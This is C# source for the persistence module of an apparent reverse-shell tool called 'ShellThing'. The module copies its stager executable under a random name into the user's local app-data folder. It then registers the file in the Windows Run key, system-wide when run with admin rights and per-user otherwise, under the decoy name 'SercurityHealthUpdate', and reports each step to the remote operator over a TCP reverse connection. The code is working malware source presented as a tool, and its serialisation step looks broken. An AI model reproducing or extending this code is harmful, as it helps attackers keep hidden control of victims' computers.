using System;
using System.Reflection;
using System.Security.Principal;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using Microsoft.Win32;
using System.IO;
using System.Runtime.Serialization.Formatters.Binary;
using System.Runtime.InteropServices;
using System.CodeDom.Compiler;

namespace ShellThing
{
    public class Persistence
    {
        Assembly stagerAssembly;
        TcpReverseConnection connection;

        public Persistence(TcpReverseConnection connection)
        {
            // Get the stager assembly to be used for persistence
            this.stagerAssembly = Assembly.GetEntryAssembly();
            this.connection = connection;
        }

        public void Execute(string persistenceMethod)
        {
            // TODO: use switch statement to select function for particular persistence method
            switch (persistenceMethod.ToLower())
            {
                case "registry":
                    RegistryPersistence();
                    break;
                default:
                    RegistryPersistence();
                    break;
            }
        }

        /// <summary>
        /// Writes stager to HKLM Run key if Admin privileges found. Otherwise writes stager to HKCU run key
        /// </summary>
        private void RegistryPersistence()
        {
            // TODO: Accept user input for registry value and file names with option for default random name generation
            connection.SendData("[*] Writing stager to file...\n");
            string fileName = WriteStagerToFile();

            string key;

            if (CheckAdminPrivileges())
            {
                key = @"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run";
            }
            else
            {
                key = @"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run";
            }

            Registry.SetValue(key, "SercurityHealthUpdate", fileName);
            connection.SendData($"[+] Stager added to Key: {key}\n");
        }

        /// <summary>
        /// Write the stager assembly to %LocalAppData% with a random name and return the file path
        /// </summary>
        private string WriteStagerToFile()
        {
            byte[] assemblyBytes;

            using (MemoryStream stream = new MemoryStream())
            {
                BinaryFormatter formatter = new BinaryFormatter();
                formatter.Serialize(stream, stagerAssembly);
                assemblyBytes = stream.ToArray();
            }

            string localAppData = Environment.GetEnvironmentVariable("LocalAppData");

            // Generate a random string for the filename
            string filePath = localAppData + "\\\\" + (Convert.ToBase64String(Guid.NewGuid().ToByteArray()).Substring(0, 4)) + ".exe";

            try
            {
                File.WriteAllBytes($"{filePath}", assemblyBytes);
                connection.SendData($"[+] Stager written to file {filePath}\n");
            }
            catch (Exception e)
            {
                connection.SendData($"Error: WriteStagerToFile - {e.Message}\n");
            }
            

            return filePath;
        }

        public static bool CheckAdminPrivileges()
        {
            bool isAdmin = false;
            WindowsIdentity currentUserIdentity = WindowsIdentity.GetCurrent();
            if (currentUserIdentity == null)
            {
                throw new NullReferenceException("RegistryPersistence: Unable to get current user identity\n");
            }

            WindowsPrincipal principal = new WindowsPrincipal(currentUserIdentity);
            // This will resolve false if the user is a local administrator but not elevated (UAC)
            isAdmin = principal.IsInRole(WindowsBuiltInRole.Administrator);

            return isAdmin;
        }
    }
}
